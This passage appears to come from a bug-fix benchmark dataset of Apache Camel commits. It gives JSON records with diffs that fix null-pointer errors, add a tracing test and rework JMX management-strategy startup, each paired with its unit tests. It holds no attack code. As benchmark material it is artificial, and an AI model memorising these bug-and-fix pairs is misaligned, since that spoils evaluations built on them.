                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/processor/interceptor/DefaultTraceEventMessage.java?ref=c1a40c3d0367300e098d7cf4518a15d2dd63f46c",
                "deletions": 15,
                "filename": "camel-core/src/main/java/org/apache/camel/processor/interceptor/DefaultTraceEventMessage.java",
                "patch": "@@ -21,10 +21,8 @@\n \n import org.apache.camel.Exchange;\n import org.apache.camel.Message;\n-import org.apache.camel.Processor;\n import org.apache.camel.model.ProcessorDefinition;\n import org.apache.camel.RouteNode;\n-import org.apache.camel.processor.Traceable;\n import org.apache.camel.spi.TraceableUnitOfWork;\n import org.apache.camel.util.MessageHelper;\n \n@@ -82,33 +80,25 @@ public DefaultTraceEventMessage(final Date timestamp, final ProcessorDefinition\n \n     // Implementation\n     //---------------------------------------------------------------\n-    private String extractTraceLabel(RouteNode entry) {\n-        Processor processor = entry.getProcessor();\n-        if (processor instanceof Traceable) {\n-            Traceable trace = (Traceable) processor;\n-            return trace.getTraceLabel();\n-        }\n-        return processor.toString();\n-    }\n \n-    private String extractShortExchangeId(Exchange exchange) {\n+    private static String extractShortExchangeId(Exchange exchange) {\n         return exchange.getExchangeId().substring(exchange.getExchangeId().indexOf(\"/\") + 1);\n     }\n \n-    private String extractFromNode(Exchange exchange) {\n+    private static String extractFromNode(Exchange exchange) {\n         if (exchange.getUnitOfWork() instanceof TraceableUnitOfWork) {\n             TraceableUnitOfWork tuow = (TraceableUnitOfWork) exchange.getUnitOfWork();\n             RouteNode last = tuow.getSecondLastNode();\n-            return last != null ? extractTraceLabel(last) : null;\n+            return last != null ? last.getLabel(exchange) : null;\n         }\n         return null;\n     }\n \n-    private String extractToNode(Exchange exchange) {\n+    private static String extractToNode(Exchange exchange) {\n         if (exchange.getUnitOfWork() instanceof TraceableUnitOfWork) {\n             TraceableUnitOfWork tuow = (TraceableUnitOfWork) exchange.getUnitOfWork();\n             RouteNode last = tuow.getLastNode();\n-            return last != null ? extractTraceLabel(last) : null;\n+            return last != null ? last.getLabel(exchange) : null;\n         }\n         return null;\n     }",
                "raw_url": "https://github.com/apache/camel/raw/c1a40c3d0367300e098d7cf4518a15d2dd63f46c/camel-core/src/main/java/org/apache/camel/processor/interceptor/DefaultTraceEventMessage.java",
                "sha": "5711d26e5eb7da874cbc128c3acb240779c95cc5",
                "status": "modified"
            },
            {
                "additions": 0,
                "blob_url": "https://github.com/apache/camel/blob/c1a40c3d0367300e098d7cf4518a15d2dd63f46c/camel-core/src/test/java/org/apache/camel/processor/DefaultErrorHandlerOnExceptionTest.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/processor/DefaultErrorHandlerOnExceptionTest.java?ref=c1a40c3d0367300e098d7cf4518a15d2dd63f46c",
                "deletions": 2,
                "filename": "camel-core/src/test/java/org/apache/camel/processor/DefaultErrorHandlerOnExceptionTest.java",
                "patch": "@@ -52,8 +52,6 @@ protected RouteBuilder createRouteBuilder() throws Exception {\n         return new RouteBuilder() {\n             @Override\n             public void configure() throws Exception {\n-                context.setTracing(true);\n-\n                 onException(IllegalArgumentException.class).handled(true).to(\"log:boom\").to(\"mock:boom\");\n \n                 from(\"direct:start\").process(new Processor() {",
                "raw_url": "https://github.com/apache/camel/raw/c1a40c3d0367300e098d7cf4518a15d2dd63f46c/camel-core/src/test/java/org/apache/camel/processor/DefaultErrorHandlerOnExceptionTest.java",
                "sha": "080083ac3d882ca45694a76d7d77e4dcd0a8caca",
                "status": "modified"
            },
            {
                "additions": 103,
                "blob_url": "https://github.com/apache/camel/blob/c1a40c3d0367300e098d7cf4518a15d2dd63f46c/camel-core/src/test/java/org/apache/camel/processor/DefaultErrorHandlerOnExceptionTraceTest.java",
                "changes": 103,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/processor/DefaultErrorHandlerOnExceptionTraceTest.java?ref=c1a40c3d0367300e098d7cf4518a15d2dd63f46c",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/processor/DefaultErrorHandlerOnExceptionTraceTest.java",
                "patch": "@@ -0,0 +1,103 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.processor;\n+\n+import org.apache.camel.ContextTestSupport;\n+import org.apache.camel.Exchange;\n+import org.apache.camel.Processor;\n+import org.apache.camel.builder.RouteBuilder;\n+import org.apache.camel.component.mock.MockEndpoint;\n+import org.apache.camel.processor.interceptor.TraceEventMessage;\n+import org.apache.camel.processor.interceptor.Tracer;\n+\n+/**\n+ * Default error handler test with trace\n+ *\n+ * @version $Revision$\n+ */\n+public class DefaultErrorHandlerOnExceptionTraceTest extends ContextTestSupport {\n+\n+    public void testOk() throws Exception {\n+        MockEndpoint mock = getMockEndpoint(\"mock:result\");\n+        mock.expectedBodiesReceived(\"Bye World\");\n+        getMockEndpoint(\"mock:trace\").expectedMessageCount(2);\n+\n+        template.sendBody(\"direct:start\", \"Hello World\");\n+\n+        assertMockEndpointsSatisfied();\n+\n+        TraceEventMessage msg1 = getMockEndpoint(\"mock:trace\").getReceivedExchanges().get(0).getIn().getBody(TraceEventMessage.class);\n+        TraceEventMessage msg2 = getMockEndpoint(\"mock:trace\").getReceivedExchanges().get(1).getIn().getBody(TraceEventMessage.class);\n+\n+        assertEquals(\"direct:start\", msg1.getFromEndpointUri());\n+        assertTrue(msg1.getToNode().startsWith(\"org.apache.camel.processor.DefaultErrorHandlerOnExceptionTraceTest\"));\n+\n+        assertTrue(msg2.getPreviousNode().startsWith(\"org.apache.camel.processor.DefaultErrorHandlerOnExceptionTraceTest\"));\n+        assertEquals(\"mock:result\", msg2.getToNode());\n+    }\n+\n+    public void testWithError() throws Exception {\n+        MockEndpoint mock = getMockEndpoint(\"mock:boom\");\n+        mock.expectedMessageCount(1);\n+        getMockEndpoint(\"mock:trace\").expectedMessageCount(4);\n+\n+        template.sendBody(\"direct:start\", \"Kabom\");\n+\n+        assertMockEndpointsSatisfied();\n+\n+        TraceEventMessage msg1 = getMockEndpoint(\"mock:trace\").getReceivedExchanges().get(0).getIn().getBody(TraceEventMessage.class);\n+        TraceEventMessage msg2 = getMockEndpoint(\"mock:trace\").getReceivedExchanges().get(1).getIn().getBody(TraceEventMessage.class);\n+        TraceEventMessage msg3 = getMockEndpoint(\"mock:trace\").getReceivedExchanges().get(2).getIn().getBody(TraceEventMessage.class);\n+        TraceEventMessage msg4 = getMockEndpoint(\"mock:trace\").getReceivedExchanges().get(3).getIn().getBody(TraceEventMessage.class);\n+\n+        assertEquals(\"direct:start\", msg1.getFromEndpointUri());\n+        assertTrue(msg1.getToNode().startsWith(\"org.apache.camel.processor.DefaultErrorHandlerOnExceptionTraceTest\"));\n+\n+        assertTrue(msg2.getPreviousNode().startsWith(\"org.apache.camel.processor.DefaultErrorHandlerOnExceptionTraceTest\"));\n+        assertEquals(\"OnException[IllegalArgumentException]\", msg2.getToNode());\n+\n+        assertEquals(\"OnException[IllegalArgumentException]\", msg3.getPreviousNode());\n+        assertEquals(\"log:boom\", msg3.getToNode());\n+\n+        assertEquals(\"log:boom\", msg4.getPreviousNode());\n+        assertEquals(\"mock:boom\", msg4.getToNode());\n+    }\n+\n+    @Override\n+    protected RouteBuilder createRouteBuilder() throws Exception {\n+        return new RouteBuilder() {\n+            @Override\n+            public void configure() throws Exception {\n+                Tracer tracer = new Tracer();\n+                tracer.setDestinationUri(\"mock:trace\");\n+                context.addInterceptStrategy(tracer);\n+\n+                onException(IllegalArgumentException.class).handled(true).to(\"log:boom\").to(\"mock:boom\");\n+\n+                from(\"direct:start\").process(new Processor() {\n+                    public void process(Exchange exchange) throws Exception {\n+                        String body = exchange.getIn().getBody(String.class);\n+                        if (\"Kabom\".equals(body)) {\n+                            throw new IllegalArgumentException(\"Boom\");\n+                        }\n+                        exchange.getIn().setBody(\"Bye World\");\n+                    }\n+                }).to(\"mock:result\");\n+            }\n+        };\n+    }\n+}\n\\ No newline at end of file",
                "raw_url": "https://github.com/apache/camel/raw/c1a40c3d0367300e098d7cf4518a15d2dd63f46c/camel-core/src/test/java/org/apache/camel/processor/DefaultErrorHandlerOnExceptionTraceTest.java",
                "sha": "3dbefe064c7f31c3ec4cf08b72f74041cda8de6b",
                "status": "added"
            }
        ],
        "message": "CAMEL-1759: Added unit test and fixed a NPE in DefaultTraceEventMessage.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@788943 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/a000adb6bf5808b28940a8dd4e4bb3d084007144",
        "patched_files": [
            "DefaultTraceEventMessage.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "DefaultErrorHandlerOnExceptionTraceTest.java",
            "DefaultErrorHandlerOnExceptionTest.java"
        ]
    },
    "camel_c339fa9": {
        "bug_id": "camel_c339fa9",
        "commit": "https://github.com/apache/camel/commit/c339fa9c90643ce345060eff3ebee664114caade",
        "file": [
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/c339fa9c90643ce345060eff3ebee664114caade/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/DefaultCxfBinding.java",
                "changes": 6,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/DefaultCxfBinding.java?ref=c339fa9c90643ce345060eff3ebee664114caade",
                "deletions": 2,
                "filename": "components/camel-cxf/src/main/java/org/apache/camel/component/cxf/DefaultCxfBinding.java",
                "patch": "@@ -684,8 +684,10 @@ protected void propagateHeadersFromCamelToCxf(Exchange camelExchange,\n             \n             // We need to copy the content-type if the dataformat is RAW\n             if (Message.CONTENT_TYPE.equalsIgnoreCase(entry.getKey()) && dataFormat.equals(DataFormat.RAW)) {\n-                LOG.debug(\"Propagate to CXF header: {} value: {}\", Message.CONTENT_TYPE, entry.getValue());\n-                cxfContext.put(Message.CONTENT_TYPE, entry.getValue().toString());\n+                if (entry.getValue() != null) {\n+                    LOG.debug(\"Propagate to CXF header: {} value: {}\", Message.CONTENT_TYPE, entry.getValue());\n+                    cxfContext.put(Message.CONTENT_TYPE, entry.getValue().toString());\n+                }\n                 continue;\n             }\n             ",
                "raw_url": "https://github.com/apache/camel/raw/c339fa9c90643ce345060eff3ebee664114caade/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/DefaultCxfBinding.java",
                "sha": "b6b9348d8da58d274436db77f475ee5408ea596d",
                "status": "modified"
            }
        ],
        "message": "Fixed potential NPE",
        "parent": "https://github.com/apache/camel/commit/60c1e38ef13cc0f2a83e53a14cf49dbef2532366",
        "patched_files": [
            "DefaultCxfBinding.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "DefaultCxfBindingTest.java"
        ]
    },
    "camel_c3b6f81": {
        "bug_id": "camel_c3b6f81",
        "commit": "https://github.com/apache/camel/commit/c3b6f810ca548945ec875cb5bd252ff2bb7f88e8",
        "file": [
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/c3b6f810ca548945ec875cb5bd252ff2bb7f88e8/components/camel-hdfs/src/test/java/org/apache/camel/component/hdfs/HdfsConsumerTest.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-hdfs/src/test/java/org/apache/camel/component/hdfs/HdfsConsumerTest.java?ref=c3b6f810ca548945ec875cb5bd252ff2bb7f88e8",
                "deletions": 1,
                "filename": "components/camel-hdfs/src/test/java/org/apache/camel/component/hdfs/HdfsConsumerTest.java",
                "patch": "@@ -247,7 +247,8 @@ public void testReadWithReadSuffix() throws Exception {\n             return;\n         }\n \n-        int before = new File(\"target/test\").list().length;\n+        String[] beforeFiles = new File(\"target/test\").list();\n+        int before = beforeFiles != null ? beforeFiles.length : 0;\n \n         final Path file = new Path(new File(\"target/test/test-camel-boolean\").getAbsolutePath());\n         Configuration conf = new Configuration();",
                "raw_url": "https://github.com/apache/camel/raw/c3b6f810ca548945ec875cb5bd252ff2bb7f88e8/components/camel-hdfs/src/test/java/org/apache/camel/component/hdfs/HdfsConsumerTest.java",
                "sha": "3386e8d90fa3242a8499168a6fc916eb7a60308e",
                "status": "modified"
            },
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/c3b6f810ca548945ec875cb5bd252ff2bb7f88e8/components/camel-hdfs2/src/test/java/org/apache/camel/component/hdfs2/HdfsConsumerTest.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-hdfs2/src/test/java/org/apache/camel/component/hdfs2/HdfsConsumerTest.java?ref=c3b6f810ca548945ec875cb5bd252ff2bb7f88e8",
                "deletions": 1,
                "filename": "components/camel-hdfs2/src/test/java/org/apache/camel/component/hdfs2/HdfsConsumerTest.java",
                "patch": "@@ -247,7 +247,8 @@ public void testReadWithReadSuffix() throws Exception {\n             return;\n         }\n \n-        int before = new File(\"target/test\").list().length;\n+        String[] beforeFiles = new File(\"target/test\").list();\n+        int before = beforeFiles != null ? beforeFiles.length : 0;\n \n         final Path file = new Path(new File(\"target/test/test-camel-boolean\").getAbsolutePath());\n         Configuration conf = new Configuration();",
                "raw_url": "https://github.com/apache/camel/raw/c3b6f810ca548945ec875cb5bd252ff2bb7f88e8/components/camel-hdfs2/src/test/java/org/apache/camel/component/hdfs2/HdfsConsumerTest.java",
                "sha": "a55c4219ff58d68b08cb90fc4ec94494dc812926",
                "status": "modified"
            }
        ],
        "message": "Fixed potential NPE in unit test",
        "parent": "https://github.com/apache/camel/commit/fa38e09b92ce6b4495413ced3e42d391462de72f",
        "patched_files": [
            "HdfsConsumer.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "HdfsConsumerTest.java"
        ]
    },
    "camel_c5296e4": {
        "bug_id": "camel_c5296e4",
        "commit": "https://github.com/apache/camel/commit/c5296e487884418de8dde15e832ea72b027e073f",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/c5296e487884418de8dde15e832ea72b027e073f/camel-core/src/main/java/org/apache/camel/impl/DefaultExchange.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/DefaultExchange.java?ref=c5296e487884418de8dde15e832ea72b027e073f",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/DefaultExchange.java",
                "patch": "@@ -394,7 +394,7 @@ public UnitOfWork getUnitOfWork() {\n \n     public void setUnitOfWork(UnitOfWork unitOfWork) {\n         this.unitOfWork = unitOfWork;\n-        if (onCompletions != null) {\n+        if (unitOfWork != null && onCompletions != null) {\n             // now an unit of work has been assigned so add the on completions\n             // we might have registered already\n             for (Synchronization onCompletion : onCompletions) {",
                "raw_url": "https://github.com/apache/camel/raw/c5296e487884418de8dde15e832ea72b027e073f/camel-core/src/main/java/org/apache/camel/impl/DefaultExchange.java",
                "sha": "3045838636c6d4706c1df500b707443555a9607a",
                "status": "modified"
            }
        ],
        "message": "CAMEL-7785: Fixed potential NPE.",
        "parent": "https://github.com/apache/camel/commit/1ad23d044c389a8121b9ff5d280dd2b17884311e",
        "patched_files": [
            "DefaultExchange.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "DefaultExchangeTest.java"
        ]
    },
    "camel_c6620db": {
        "bug_id": "camel_c6620db",
        "commit": "https://github.com/apache/camel/commit/c6620dbace9ae1e15981f4c31b1a97b4c396cde6",
        "file": [
            {
                "additions": 8,
                "blob_url": "https://github.com/apache/camel/blob/c6620dbace9ae1e15981f4c31b1a97b4c396cde6/camel-core/src/main/java/org/apache/camel/CamelContext.java",
                "changes": 10,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/CamelContext.java?ref=c6620dbace9ae1e15981f4c31b1a97b4c396cde6",
                "deletions": 2,
                "filename": "camel-core/src/main/java/org/apache/camel/CamelContext.java",
                "patch": "@@ -18,7 +18,9 @@\n \n import java.io.IOException;\n import java.io.InputStream;\n-import java.util.*;\n+import java.util.Collection;\n+import java.util.List;\n+import java.util.Map;\n import java.util.Properties;\n import java.util.concurrent.ScheduledExecutorService;\n import java.util.concurrent.TimeUnit;\n@@ -1019,8 +1021,12 @@\n \n     /**\n      * Disables using JMX as {@link org.apache.camel.spi.ManagementStrategy}.\n+     * <p/>\n+     * <b>Important:</b> This method must be called <b>before</b> the {@link CamelContext} is started.\n+     *\n+     * @throws IllegalStateException is thrown if the {@link CamelContext} is not in stopped state.\n      */\n-    void disableJMX();\n+    void disableJMX() throws IllegalStateException;\n \n     /**\n      * Gets the inflight repository",
                "raw_url": "https://github.com/apache/camel/raw/c6620dbace9ae1e15981f4c31b1a97b4c396cde6/camel-core/src/main/java/org/apache/camel/CamelContext.java",
                "sha": "839b00d8e933e1c022fe5c54ca3225b30f1d9c77",
                "status": "modified"
            },
            {
                "additions": 10,
                "blob_url": "https://github.com/apache/camel/blob/c6620dbace9ae1e15981f4c31b1a97b4c396cde6/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "changes": 29,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java?ref=c6620dbace9ae1e15981f4c31b1a97b4c396cde6",
                "deletions": 19,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "patch": "@@ -34,7 +34,6 @@\n import java.util.TreeMap;\n import java.util.concurrent.ScheduledExecutorService;\n import java.util.concurrent.TimeUnit;\n-import java.util.concurrent.atomic.AtomicBoolean;\n import java.util.concurrent.atomic.AtomicInteger;\n import javax.naming.Context;\n import javax.xml.bind.JAXBContext;\n@@ -74,6 +73,7 @@\n import org.apache.camel.impl.converter.DefaultTypeConverter;\n import org.apache.camel.impl.converter.LazyLoadingTypeConverter;\n import org.apache.camel.management.DefaultManagementMBeanAssembler;\n+import org.apache.camel.management.DefaultManagementStrategy;\n import org.apache.camel.management.JmxSystemPropertyKeys;\n import org.apache.camel.management.ManagementStrategyFactory;\n import org.apache.camel.model.Constants;\n@@ -167,7 +167,6 @@\n     private List<LifecycleStrategy> lifecycleStrategies = new ArrayList<LifecycleStrategy>();\n     private ManagementStrategy managementStrategy;\n     private ManagementMBeanAssembler managementMBeanAssembler;\n-    private final AtomicBoolean managementStrategyInitialized = new AtomicBoolean(false);\n     private final List<RouteDefinition> routeDefinitions = new ArrayList<RouteDefinition>();\n     private List<InterceptStrategy> interceptStrategies = new ArrayList<InterceptStrategy>();\n \n@@ -242,6 +241,10 @@ public DefaultCamelContext() {\n             packageScanClassResolver = new DefaultPackageScanClassResolver();\n         }\n \n+        // setup management strategy first since end users may use it to add event notifiers\n+        // using the management strategy before the CamelContext has been started\n+        this.managementStrategy = createManagementStrategy();\n+\n         Container.Instance.manage(this);\n     }\n \n@@ -2436,26 +2439,11 @@ public void setNodeIdFactory(NodeIdFactory idFactory) {\n     }\n \n     public ManagementStrategy getManagementStrategy() {\n-        synchronized (managementStrategyInitialized) {\n-            if (!managementStrategyInitialized.get()) {\n-                if (managementStrategyInitialized.compareAndSet(false, true)) {\n-                    managementStrategy = createManagementStrategy();\n-                }\n-            }\n-        }\n-\n         return managementStrategy;\n     }\n \n     public void setManagementStrategy(ManagementStrategy managementStrategy) {\n-        synchronized (managementStrategyInitialized) {\n-            if (managementStrategyInitialized.get()) {\n-                log.warn(\"Resetting ManagementStrategy for CamelContext: \" + getName());\n-            }\n-\n-            this.managementStrategy = managementStrategy;\n-            managementStrategyInitialized.set(true);\n-        }\n+        this.managementStrategy = managementStrategy;\n     }\n \n     public InterceptStrategy getDefaultTracer() {\n@@ -2492,7 +2480,10 @@ public void setDefaultBacklogDebugger(InterceptStrategy defaultBacklogDebugger)\n     }\n \n     public void disableJMX() {\n-        disableJMX = true;\n+        if (isStarting() || isStarted()) {\n+            throw new IllegalStateException(\"Disabling JMX can only be done when CamelContext has not been started\");\n+        }\n+        managementStrategy = new DefaultManagementStrategy(this);\n     }\n \n     public InflightRepository getInflightRepository() {",
                "raw_url": "https://github.com/apache/camel/raw/c6620dbace9ae1e15981f4c31b1a97b4c396cde6/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "sha": "385a9208986dae07dea94fb2954a17d54b609326",
                "status": "modified"
            },
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/c6620dbace9ae1e15981f4c31b1a97b4c396cde6/camel-core/src/main/java/org/apache/camel/management/DefaultManagementAgent.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/management/DefaultManagementAgent.java?ref=c6620dbace9ae1e15981f4c31b1a97b4c396cde6",
                "deletions": 0,
                "filename": "camel-core/src/main/java/org/apache/camel/management/DefaultManagementAgent.java",
                "patch": "@@ -265,6 +265,9 @@ public boolean isRegistered(ObjectName name) {\n     protected void doStart() throws Exception {\n         ObjectHelper.notNull(camelContext, \"CamelContext\");\n \n+        // must add management lifecycle strategy\n+        camelContext.getLifecycleStrategies().add(0, new DefaultManagementLifecycleStrategy(camelContext));\n+\n         // create mbean server if is has not be injected.\n         if (server == null) {\n             finalizeSettings();",
                "raw_url": "https://github.com/apache/camel/raw/c6620dbace9ae1e15981f4c31b1a97b4c396cde6/camel-core/src/main/java/org/apache/camel/management/DefaultManagementAgent.java",
                "sha": "eeda9c9a4ce8cccadc9f0d2f42db3ceef7347b3f",
                "status": "modified"
            },
            {
                "additions": 14,
                "blob_url": "https://github.com/apache/camel/blob/c6620dbace9ae1e15981f4c31b1a97b4c396cde6/camel-core/src/main/java/org/apache/camel/management/DefaultManagementStrategy.java",
                "changes": 24,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/management/DefaultManagementStrategy.java?ref=c6620dbace9ae1e15981f4c31b1a97b4c396cde6",
                "deletions": 10,
                "filename": "camel-core/src/main/java/org/apache/camel/management/DefaultManagementStrategy.java",
                "patch": "@@ -32,8 +32,11 @@\n import org.apache.camel.spi.ManagementNamingStrategy;\n import org.apache.camel.spi.ManagementObjectStrategy;\n import org.apache.camel.spi.ManagementStrategy;\n+import org.apache.camel.support.ServiceSupport;\n import org.apache.camel.util.ObjectHelper;\n import org.apache.camel.util.ServiceHelper;\n+import org.slf4j.Logger;\n+import org.slf4j.LoggerFactory;\n \n /**\n  * A default management strategy that does <b>not</b> manage.\n@@ -48,8 +51,9 @@\n  * @see ManagedManagementStrategy\n  * @version \n  */\n-public class DefaultManagementStrategy implements ManagementStrategy, CamelContextAware {\n+public class DefaultManagementStrategy extends ServiceSupport implements ManagementStrategy, CamelContextAware {\n \n+    private static final transient Logger LOG = LoggerFactory.getLogger(DefaultManagementStrategy.class);\n     private List<EventNotifier> eventNotifiers = new CopyOnWriteArrayList<EventNotifier>();\n     private EventFactory eventFactory = new DefaultEventFactory();\n     private ManagementNamingStrategy managementNamingStrategy;\n@@ -198,7 +202,12 @@ public void setLoadStatisticsEnabled(boolean loadStatisticsEnabled) {\n         this.loadStatisticsEnabled = loadStatisticsEnabled;\n     }\n \n-    public void start() throws Exception {\n+    protected void doStart() throws Exception {\n+        LOG.info(\"JMX is disabled\");\n+        doStartManagementStrategy();\n+    }\n+\n+    protected void doStartManagementStrategy() throws Exception {\n         ObjectHelper.notNull(camelContext, \"CamelContext\");\n \n         if (eventNotifiers != null) {\n@@ -215,7 +224,7 @@ public void start() throws Exception {\n         }\n \n         if (managementAgent != null) {\n-            managementAgent.start();\n+            ServiceHelper.startService(managementAgent);\n             // set the naming strategy using the domain name from the agent\n             if (managementNamingStrategy == null) {\n                 setManagementNamingStrategy(new DefaultManagementNamingStrategy(managementAgent.getMBeanObjectDomainName()));\n@@ -226,13 +235,8 @@ public void start() throws Exception {\n         }\n     }\n \n-    public void stop() throws Exception {\n-        if (managementAgent != null) {\n-            managementAgent.stop();\n-        }\n-        if (eventNotifiers != null) {\n-            ServiceHelper.stopServices(eventNotifiers);\n-        }\n+    protected void doStop() throws Exception {\n+        ServiceHelper.stopServices(managementAgent, eventNotifiers);\n     }\n \n }",
                "raw_url": "https://github.com/apache/camel/raw/c6620dbace9ae1e15981f4c31b1a97b4c396cde6/camel-core/src/main/java/org/apache/camel/management/DefaultManagementStrategy.java",
                "sha": "63aa1322f51d2f75f94ef9cb691c6ac8f13555e0",
                "status": "modified"
            },
            {
                "additions": 6,
                "blob_url": "https://github.com/apache/camel/blob/c6620dbace9ae1e15981f4c31b1a97b4c396cde6/camel-core/src/main/java/org/apache/camel/management/ManagedManagementStrategy.java",
                "changes": 6,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/management/ManagedManagementStrategy.java?ref=c6620dbace9ae1e15981f4c31b1a97b4c396cde6",
                "deletions": 0,
                "filename": "camel-core/src/main/java/org/apache/camel/management/ManagedManagementStrategy.java",
                "patch": "@@ -182,4 +182,10 @@ private ObjectName getObjectName(Object managedObject, Object preferedName) thro\n         return objectName;\n     }\n \n+    @Override\n+    protected void doStart() throws Exception {\n+        LOG.info(\"JMX is enabled\");\n+        doStartManagementStrategy();\n+    }\n+\n }",
                "raw_url": "https://github.com/apache/camel/raw/c6620dbace9ae1e15981f4c31b1a97b4c396cde6/camel-core/src/main/java/org/apache/camel/management/ManagedManagementStrategy.java",
                "sha": "f89ffb4a9803327428fda19481a302855387e60e",
                "status": "modified"
            },
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/c6620dbace9ae1e15981f4c31b1a97b4c396cde6/camel-core/src/main/java/org/apache/camel/management/ManagementStrategyFactory.java",
                "changes": 17,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/management/ManagementStrategyFactory.java?ref=c6620dbace9ae1e15981f4c31b1a97b4c396cde6",
                "deletions": 13,
                "filename": "camel-core/src/main/java/org/apache/camel/management/ManagementStrategyFactory.java",
                "patch": "@@ -18,7 +18,6 @@\n \n import org.apache.camel.CamelContext;\n import org.apache.camel.spi.ManagementStrategy;\n-import org.apache.camel.util.ServiceHelper;\n import org.slf4j.Logger;\n import org.slf4j.LoggerFactory;\n \n@@ -29,27 +28,19 @@\n     private final transient Logger log = LoggerFactory.getLogger(getClass());\n \n     public ManagementStrategy create(CamelContext context, boolean disableJMX) {\n-        ManagementStrategy answer = null;\n+        ManagementStrategy answer;\n \n         if (disableJMX || Boolean.getBoolean(JmxSystemPropertyKeys.DISABLED)) {\n-            log.info(\"JMX is disabled.\");\n+            answer = new DefaultManagementStrategy(context);\n         } else {\n             try {\n                 answer = new ManagedManagementStrategy(context, new DefaultManagementAgent(context));\n-                // must start it to ensure JMX works and can load needed Spring JARs\n-                ServiceHelper.startService(answer);\n-                // prefer to have it at first strategy\n-                context.getLifecycleStrategies().add(0, new DefaultManagementLifecycleStrategy(context));\n-                log.info(\"JMX enabled.\");\n             } catch (Exception e) {\n-                answer = null;\n                 log.warn(\"Cannot create JMX lifecycle strategy. Will fallback and disable JMX.\", e);\n+                answer = new DefaultManagementStrategy(context);\n             }\n         }\n-\n-        if (answer == null) {\n-            answer = new DefaultManagementStrategy(context);\n-        }\n         return answer;\n     }\n+\n }",
                "raw_url": "https://github.com/apache/camel/raw/c6620dbace9ae1e15981f4c31b1a97b4c396cde6/camel-core/src/main/java/org/apache/camel/management/ManagementStrategyFactory.java",
                "sha": "50d55fa659451985635e16f1bb8b7c4b8d38c69b",
                "status": "modified"
            },
            {
                "additions": 35,
                "blob_url": "https://github.com/apache/camel/blob/c6620dbace9ae1e15981f4c31b1a97b4c396cde6/camel-core/src/test/java/org/apache/camel/management/CamelContextDisableJmxTest.java",
                "changes": 35,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/management/CamelContextDisableJmxTest.java?ref=c6620dbace9ae1e15981f4c31b1a97b4c396cde6",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/management/CamelContextDisableJmxTest.java",
                "patch": "@@ -0,0 +1,35 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.management;\n+\n+import junit.framework.TestCase;\n+import org.apache.camel.CamelContext;\n+import org.apache.camel.impl.DefaultCamelContext;\n+\n+public class CamelContextDisableJmxTest extends TestCase {\n+\n+    public void testDisableJmx() throws Exception {\n+        CamelContext context = new DefaultCamelContext();\n+        context.disableJMX();\n+        context.start();\n+\n+        // JMX should be disabled and therefore not a ManagedManagementStrategy instance\n+        assertFalse(context.getManagementStrategy() instanceof ManagedManagementStrategy);\n+\n+        